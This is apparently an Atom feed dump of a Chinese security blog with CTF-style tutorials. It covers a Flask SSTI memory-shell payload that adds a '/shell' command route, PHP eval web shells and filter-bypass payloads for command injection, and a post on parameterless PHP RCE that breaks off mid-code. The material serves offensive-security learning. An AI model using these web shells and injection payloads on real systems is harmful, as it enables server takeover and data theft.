    <content type="html"><![CDATA[<h2 id="存在flask-ssti漏洞环境"><a href="#存在flask-ssti漏洞环境" class="headerlink" title="存在flask ssti漏洞环境"></a>存在flask ssti漏洞环境</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    person = <span class="hljs-string">&#x27;guest&#x27;</span><br>    <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>):<br>        person = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    template = <span class="hljs-string">&#x27;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#x27;</span> % person<br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><h2 id="开启了debug模式下的不出网回显"><a href="#开启了debug模式下的不出网回显" class="headerlink" title="开启了debug模式下的不出网回显"></a>开启了debug模式下的不出网回显</h2><p>在debug模式下，报错会带出详细信息，debug模式常见的考点有算pin码进console来命令执行</p><p>其实我们也可以通过手动报错<code>raise Exception()</code>的方式来让我们的命令回显</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;exec&#x27;</span>](<span class="hljs-string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read())&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><img src="/blog/2025/02/03/Python/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250203182013486.png" class title="image-20250203182013486"><h2 id="低版本flask内存🐎环境："><a href="#低版本flask内存🐎环境：" class="headerlink" title="低版本flask内存🐎环境："></a>低版本flask内存🐎环境：</h2><ul><li>flask 2.0.1</li><li>werkzeug 2.2.2</li></ul><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>],<span class="hljs-string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p>分析下这个payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs json">url_for.__globals__<span class="hljs-punctuation">[</span>&#x27;__builtins__&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;eval&#x27;<span class="hljs-punctuation">]</span>(<br><span class="hljs-string">&quot;app.add_url_rule(</span><br><span class="hljs-string">&#x27;/shell&#x27;, </span><br><span class="hljs-string">&#x27;shell&#x27;, </span><br><span class="hljs-string">lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span><br><span class="hljs-string">)</span><br><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#123;</span><br>&#x27;_request_ctx_stack&#x27;<span class="hljs-punctuation">:</span>url_for.__globals__<span class="hljs-punctuation">[</span>&#x27;_request_ctx_stack&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>&#x27;app&#x27;<span class="hljs-punctuation">:</span>url_for.__globals__<span class="hljs-punctuation">[</span>&#x27;current_app&#x27;<span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br>)<br></code></pre></td></tr></table></figure><p>首先<code>url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</code>这就是一个ssti获取eval函数的payload，url_for是Flask的一个内置函数，其命名空间包含很多东西，包括我们待会需要拿的当前应用的上下文。</p><h4 id="add-url-rule"><a href="#add-url-rule" class="headerlink" title="add_url_rule:"></a>add_url_rule:</h4><p>Flask注册路由是使用@app.route()装饰器来实现</p><img src="/blog/2025/02/03/Python/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250203183141232.png" class title="image-20250203183141232"><p>这里使用了add_url_rule来添加路由，跟进去在看看</p><img src="/blog/2025/02/03/Python/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250203183231034.png" class title="image-20250203183231034"><ul><li>rule：函数对应的URL规则，满足条件和 app.route() 的第一个参数一样，必须以<code>/</code>开头；</li><li>endpoint：端点，即在使用 url_for() 进行反转的时候，这里传入的第一个参数就是 endpoint 对应的值。这个值也可以不指定，那么默认就会使用函数的名字作为 endpoint 的值；</li><li>view_func：URL对应的函数（注意，这里只需写函数名字而不用加括号）</li><li>provide_automatic_options：控制是否应自动添加选项方法。这也可以通过设置视图来控制_func.provide_automatic_options &#x3D;添加规则前为False；</li><li>options：要转发到基础规则对象的选项。Werkzeug 的一个变化是处理方法选项。方法是此规则应限制的方法列表（GET、POST等）。默认情况下，规则只侦听 GET（并隐式地侦听HEAD）</li></ul><p>所以payload的add_url_rule的这部分就是添加一个路由，然后处理函数是用lambda关键字定义的匿名函数</p><h4 id="app"><a href="#app" class="headerlink" title="app:"></a>app:</h4><p>eval的第二个参数就是用字典的形式定义一些全局变量给第一个参数也就是执行命令的时候用，这里的app就是用url_for获取的应用的当前上下文app，属性为<strong>current_app</strong>；</p><h4 id="request-ctx-stack："><a href="#request-ctx-stack：" class="headerlink" title="_request_ctx_stack："></a><strong>_request_ctx_stack</strong>：</h4><p><code>_request_ctx_stack</code>是Flask的一个全局变量，是一个LocalStack实例</p><p>为什么要获取这个变量呢，这和Flask的请求上下文管理机制有关：</p><p>当一个请求进入Flask，首先会实例化一个Request Context，这个上下文封装了请求的信息在Request中，并将这个上下文推入到一个名为<code>_request_ctx_stack</code> 的栈结构中，也就是说获取当前的请求上下文等同于获取<code>_request_ctx_stack</code>的栈顶元素<code>_request_ctx_stack.top</code> 。</p><p>简单来说就是为了获取访问的cmd参数，_request_ctx_stack.top.request.args.get(‘cmd’, ‘whoami’)</p><h4 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h4><p>其本质也就是个ssti的绕过</p><h5 id="url-for被过滤："><a href="#url-for被过滤：" class="headerlink" title="url_for被过滤："></a>url_for被过滤：</h5><p>可以用<code>get_flashed_messages</code>或<code>request.application.__self__._get_data_for_json</code>代替</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;get_flashed_messages.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>:get_flashed_messages.__globals__[<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>],<span class="hljs-string">&#x27;app&#x27;</span>:get_flashed_messages.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><h5 id="eval被过滤："><a href="#eval被过滤：" class="headerlink" title="eval被过滤："></a>eval被过滤：</h5><p>用exec代替或者是采用字符串拼接方式，如<code>[&#39;__builtins__&#39;][&#39;eval&#39;]</code>变为<code>[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;ev&#39;+&#39;al&#39;]</code>；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;request.application.__self__._get_data_for_json.__getattribute__(<span class="hljs-string">&#x27;__globa&#x27;</span>+<span class="hljs-string">&#x27;ls__&#x27;</span>).__getitem__(<span class="hljs-string">&#x27;__bui&#x27;</span>+<span class="hljs-string">&#x27;ltins__&#x27;</span>).__getitem__(<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ec&#x27;</span>)(<span class="hljs-string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="hljs-string">&#x27;_request_ct&#x27;</span>+<span class="hljs-string">&#x27;x_stack&#x27;</span>:get_flashed_messages.__getattribute__(<span class="hljs-string">&#x27;__globa&#x27;</span>+<span class="hljs-string">&#x27;ls__&#x27;</span>).pop(<span class="hljs-string">&#x27;_request_&#x27;</span>+<span class="hljs-string">&#x27;ctx_stack&#x27;</span>),<span class="hljs-string">&#x27;app&#x27;</span>:get_flashed_messages.__getattribute__(<span class="hljs-string">&#x27;__globa&#x27;</span>+<span class="hljs-string">&#x27;ls__&#x27;</span>).pop(<span class="hljs-string">&#x27;curre&#x27;</span>+<span class="hljs-string">&#x27;nt_app&#x27;</span>)&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><ul><li><code>__globals__</code>可用<code>__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;)</code>替换；</li><li><code>[]</code>中括号可用<code>.__getitem__()</code>或<code>.pop()</code>替换；</li></ul><p>不知道为什么我的</p><p><code>request.application.__self__._get_data_for_json.__globals__</code>说找不到<code>__globals__</code>属性</p><h5 id="app的另外获取"><a href="#app的另外获取" class="headerlink" title="app的另外获取"></a>app的另外获取</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">url_for.__globals__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;__main__&#x27;</span>].__dict__[<span class="hljs-string">&#x27;app&#x27;</span>].add_url_rule(<span class="hljs-string">&#x27;/shell&#x27;</span>,<span class="hljs-string">&#x27;shell&#x27;</span>,<span class="hljs-keyword">lambda</span> :<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;dir&#x27;</span>).read())<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RCE中遇到过滤</title>
    <link href="/blog/2025/01/29/PHP/RCE%E4%B8%AD%E9%81%87%E5%88%B0%E8%BF%87%E6%BB%A4/"/>
    <url>/blog/2025/01/29/PHP/RCE%E4%B8%AD%E9%81%87%E5%88%B0%E8%BF%87%E6%BB%A4/</url>
    
    <content type="html"><![CDATA[<h3 id="过滤-or"><a href="#过滤-or" class="headerlink" title="过滤&lt; or &lt;? or ? or php"></a>过滤&lt; or &lt;? or ? or php</h3><p>可以使用短标签绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;123&#x27;</span>;<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#前提是开启配置参数short_open_tags=on</span><br><span class="hljs-meta">&lt;?=</span>(表达式)<span class="hljs-meta">?&gt;</span>  等价于 <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> (表达式)<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#不需要开启参数设置</span><br>&lt;% <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;123&#x27;</span>;%&gt;   <span class="hljs-comment">#开启配置参数asp_tags=on，并且只能在7.0以下版本使用</span><br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;123&#x27;</span>; &lt;/script&gt; <span class="hljs-comment">#不需要修改参数开关，但是只能在7.0以下可用。</span><br><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span>            <span class="hljs-comment">//正常写法</span><br><span class="hljs-meta">&lt;?=</span>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span>               <span class="hljs-comment">//短标签，适合过滤php</span><br>    <br>&lt;% @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); %&gt;                <span class="hljs-comment">//asp风格</span><br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;  <span class="hljs-comment">//&lt;script&gt;风格，适合过滤&lt;?</span><br></code></pre></td></tr></table></figure><p>一个ctf题目fsctf[EZ_eval]2023</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;word&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$word</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;word&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|tail|more|head|nl|flag|less| /&quot;</span>, <span class="hljs-variable">$word</span>))&#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono.&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$word</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$word</span>);<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;?&gt;&quot;</span>. <span class="hljs-variable">$word</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤?与空格</p><p>注意：</p><p>也能正常执行，那就说明$word只要是一个正常的php代码就能正常执行，而?&gt;不会影响后面的php代码</p><img src="/blog/2025/01/29/PHP/RCE%E4%B8%AD%E9%81%87%E5%88%B0%E8%BF%87%E6%BB%A4/image-20250119035715816.png" class title="image-20250119035715816"><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script%<span class="hljs-number">09</span>language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;strings%09/fl*&#x27;</span>)&lt;/script&gt;<br><span class="hljs-keyword">or</span><br>&lt;script%<span class="hljs-number">09</span>language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;c\a\t%09/fl*&#x27;</span>)&lt;/script&gt;<br><span class="hljs-keyword">or</span><br>&lt;script%<span class="hljs-number">09</span>language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;paste%09/fl*&#x27;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><h3 id="过滤了空格"><a href="#过滤了空格" class="headerlink" title="过滤了空格"></a>过滤了空格</h3><p>以下是可以代替空格（url编码是%20）的：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mel">%09：tab键（水平）<br>%0a：换行<br>%0c：新的一页<br>%0d：相当于<span class="hljs-keyword">return</span>作用<br>%0b：tab键（垂直）<br>$&#123;IFS&#125;   注意：<span class="hljs-keyword">system</span>()函数里面用单引号（<span class="hljs-string">&#x27;&#x27;</span>），否则$&#123;IFS&#125;没办法被解释为空格而绕过<br>&#123;IFS&#125;<br>$IFS<br>$IFS$1 <span class="hljs-comment">//$1改成$加其他数字貌似都行</span><br>IFS<br>&lt;<br>&lt;&gt;<br>&#123;cat,flag.php&#125;  <span class="hljs-comment">//用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br>X=$&#x27;cat\x09./flag.php<span class="hljs-string">&#x27;;$X   (\x09表示tab，也可以用\x20)</span><br></code></pre></td></tr></table></figure><h3 id="禁止cat"><a href="#禁止cat" class="headerlink" title="禁止cat"></a>禁止cat</h3><h4 id="方法1使用转义符号绕过："><a href="#方法1使用转义符号绕过：" class="headerlink" title="方法1使用转义符号绕过："></a>方法1使用转义符号绕过：</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">c\<span class="hljs-selector-tag">a</span>\t<br></code></pre></td></tr></table></figure><h4 id="方法2替换法："><a href="#方法2替换法：" class="headerlink" title="方法2替换法："></a>方法2替换法：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">more:一页一页的显示档案内容<br>less:与 more 类似<br><span class="hljs-built_in">head</span>:查看头几行<br><span class="hljs-built_in">tac</span>:从最后一行开始显示，可以看出 <span class="hljs-built_in">tac</span> 是 <span class="hljs-built_in">cat</span> 的反向显示<br><span class="hljs-built_in">tail</span>:查看尾几行<br><span class="hljs-built_in">nl</span>：显示的时候，顺便输出行号<br><span class="hljs-built_in">od</span>:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br><span class="hljs-built_in">sort</span>:可以查看<br><span class="hljs-built_in">uniq</span>:可以查看<br>file -f:报错出具体内容<br>sh /flag 2&gt;%261 //报错出文件内容<br></code></pre></td></tr></table></figure><h3 id="过滤了关键字flag"><a href="#过滤了关键字flag" class="headerlink" title="过滤了关键字flag"></a>过滤了关键字flag</h3><h4 id="方法1编码绕过："><a href="#方法1编码绕过：" class="headerlink" title="方法1编码绕过："></a>方法1编码绕过：</h4><p>base64编码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;ZmxhZy5waHA=&#x27;</span> | <span class="hljs-built_in">base64</span> -d`<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWcucGhw&quot;</span> | <span class="hljs-built_in">base64</span> -d | bash  <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> Y2F0IGZsYWcucGhw|<span class="hljs-built_in">base64</span> -d|sh<br></code></pre></td></tr></table></figure><p>等同于cat flag.php</p><p>hex编码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;63617420666c61672e706870&quot;</span> | xxd -r -p | bash  //<span class="hljs-string">&quot;&quot;</span>也可以去掉  <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;63617420666c61672e706870&quot;</span> | xxd -r -p | sh     <br></code></pre></td></tr></table></figure><h4 id="方法2变量赋值拼接绕过："><a href="#方法2变量赋值拼接绕过：" class="headerlink" title="方法2变量赋值拼接绕过："></a>方法2变量赋值拼接绕过：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=fl;b=ag;<span class="hljs-built_in">cat</span> $a<span class="hljs-variable">$b</span>.php<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=g;<span class="hljs-built_in">cat</span>$IFS$1fla<span class="hljs-variable">$a</span>.php<br></code></pre></td></tr></table></figure><h4 id="方法3内联执行绕过："><a href="#方法3内联执行绕过：" class="headerlink" title="方法3内联执行绕过："></a>方法3内联执行绕过：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">ls</span>`<br><span class="hljs-built_in">echo</span> `<span class="hljs-built_in">ls</span>`;<br><span class="hljs-built_in">echo</span> $(<span class="hljs-built_in">ls</span>);<br>?&gt;&lt;?=`<span class="hljs-built_in">ls</span>`;<br>?&gt;&lt;?=$(<span class="hljs-built_in">ls</span>);<br></code></pre></td></tr></table></figure><h4 id="方法4-绕过："><a href="#方法4-绕过：" class="headerlink" title="方法4[]绕过："></a>方法4[]绕过：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> fl[a]g.php<br></code></pre></td></tr></table></figure><h4 id="方法5空变量绕过："><a href="#方法5空变量绕过：" class="headerlink" title="方法5空变量绕过："></a>方法5空变量绕过：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> fl<span class="hljs-variable">$&#123;2&#125;</span>ag //使用$*和<span class="hljs-variable">$@</span>，<span class="hljs-variable">$x</span>(x 代表 1-9),<span class="hljs-variable">$&#123;x&#125;</span>(x&gt;=10)(小于 10 也彳亍)<br></code></pre></td></tr></table></figure><h4 id="方法6通配符绕过："><a href="#方法6通配符绕过：" class="headerlink" title="方法6通配符绕过："></a>方法6通配符绕过：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> fl*<br></code></pre></td></tr></table></figure><h4 id="方法7使用转义符号绕过："><a href="#方法7使用转义符号绕过：" class="headerlink" title="方法7使用转义符号绕过："></a>方法7使用转义符号绕过：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> f\l\a\g<br></code></pre></td></tr></table></figure><h4 id="方法8’’绕过："><a href="#方法8’’绕过：" class="headerlink" title="方法8’’绕过："></a>方法8’’绕过：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> fl<span class="hljs-string">&#x27;&#x27;</span>ag<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>无参数RCE绕过思路</title>
    <link href="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/"/>
    <url>/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/</url>
    
    <content type="html"><![CDATA[<h3 id="无参数RCE题目特征"><a href="#无参数RCE题目特征" class="headerlink" title="无参数RCE题目特征"></a>无参数RCE题目特征</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>])) &#123;    <br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>正则表达式 <code>[^\W]+\((?R)?\)</code> 匹配了一个或多个非标点符号字符（简单来说匹配函数名）后跟的一个括号（表示函数调用）。其中 <code>(?R)</code> 是递归引用，它只能匹配和替换嵌套的函数调用，而不能处理函数参数。所以说经过正则表达式匹配后，每个函数都会被删除，最终只剩一个;，而题目中最终的要求也是强等于一个;，才能进行下面的eval()，简而言之来说就是要使用不带参数的函数</p><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129195640525.png" class title="image-20250129195640525"><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129195647510.png" class title="image-20250129195647510"><p>所以就需要找到能够查看目录文件的函数并且不带参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">scandir</span>()可以使用里面不含参数<br><span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;1&#x27;</span>)不可以使用，里面含有参数<span class="hljs-number">1</span>，无法被替换删除<br></code></pre></td></tr></table></figure><p>介绍以下相关payload需要的函数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）<br>localeconv() ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大）<br>current() ：返回数组中的单元，默认取第一个值。pos()和current()是同一个东西<br>getcwd() :取得当前工作目录<br><span class="hljs-built_in">dirname</span>():函数返回路径中的目录部分<br>array_flip() :交换数组中的键和值，成功时返回交换后的数组<br>array_rand() :从数组中随机取出一个或多个单元<br>array_reverse():将数组内容反转<br>strrev():用于反转给定字符串<br>getcwd()：获取当前工作目录路径<br><span class="hljs-built_in">dirname</span>() ：函数返回路径中的目录部分。<br><span class="hljs-built_in">chdir</span>() ：函数改变当前的目录。<br><span class="hljs-built_in">eval</span>()、assert()：命令执行<br>hightlight_file()、show_source()、readfile()：读取文件内容<br></code></pre></td></tr></table></figure><p>举一个例子关于scandir()函数的使用：</p><p>scandir(‘.’)是返回当前目录，就可以靠localeconv() 返回的数组第一个就是‘.’，current()取第一个值，那么current(localeconv())就能构造一个‘.’,那么以下就是一个简单的返回查看当前目录下文件的payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?参数=<span 